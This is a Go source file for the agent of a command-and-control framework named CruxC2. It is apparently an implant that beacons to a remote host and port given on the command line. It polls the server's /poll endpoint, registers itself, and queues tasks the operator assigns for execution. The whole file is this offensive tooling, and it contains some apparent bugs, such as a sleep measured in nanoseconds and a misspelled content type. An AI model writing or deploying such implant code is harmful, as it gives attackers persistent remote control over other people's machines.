package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/RandomChugokujin/CruxC2/internal/agent"
	"github.com/RandomChugokujin/CruxC2/internal/id"
	"github.com/RandomChugokujin/CruxC2/internal/protocol"
	"github.com/RandomChugokujin/CruxC2/internal/tasks"
)

func main(){
	poll_sleep := flag.Int("poll", 5, "Time of sleep between each poll")
	flag.Parse()
	args := flag.Args()
	rhost := args[0]
	rport := args[1]

	// TODO: Change to fixed generation at compile time
	agent_id := id.NewID()

	client := &http.Client{}

	base_url := fmt.Sprintf("http://%s:%s", rhost, rport)
	poll_url := fmt.Sprintf("%s/poll", base_url)
	register_url := fmt.Sprintf("%s/agent", base_url)

	// Initialize Task Manager
	tm := agent.NewTaskManager()

	// Main polling loop
	for {
		// Sending poll request
		msg := protocol.MsgTaskPoll{
			NumTasksExecuting: tm.QueueSize(),
		}
		poll_data, err := agent.NewRequest(msg, agent_id)
		if err != nil {
			panic(err)
		}
		resp, err := client.Post(poll_url, "application.json", bytes.NewBuffer(poll_data))
		if err != nil{
			panic(err)
		}

		// Reading Response Envelope
		defer resp.Body.Close()
		var response_env protocol.Envelope
		if err := json.NewDecoder(resp.Body).Decode(&response_env); err != nil {
			panic(err)
		}
		if response_env.Type != "MsgTaskAssign"{
			fmt.Fprintf(os.Stderr, "Error: received message type: %s during message poll, Type MsgTaskAssign expected.", response_env.Type)
			os.Exit(1)
		}
		var task_msg protocol.MsgTaskAssign
		if err := json.Unmarshal(response_env.Payload, &task_msg); err != nil {
			panic(err)
		}

		// Handle tasks assigned according to its type
		switch task_msg.TaskType {
		case tasks.TaskNone:
			continue
		case tasks.TaskRegister:
			// Register should make agent wait for success before doing anything else
			var reg_fail int
			for reg_fail = 0; reg_fail < 3; reg_fail++ {
				errCh := make (chan error, 1)
				go func() {
					errCh <- agent_register(register_url, agent_id)
				}()
				if err := <- errCh; err == nil {
					break
				}
			}
			if reg_fail >= 3 {
				fmt.Fprint(os.Stderr, "Error: Agent Registration failed three times consecutively, exiting...")
				os.Exit(1)
			}
		case tasks.TaskShutdown:
			// TODO: Handle task runner cancellation
			os.Exit(0)
		default:
			new_task := tasks.NewTask(task_msg.TaskType, &task_msg.Params)
			if ok := tm.Add(&new_task); !ok {
				fmt.Fprintf(os.Stderr, "Error: Unable to add received task, continuing execution:\n%s\n", new_task.String())
			}
		}


		time.Sleep(time.Duration(*poll_sleep))
	}
}
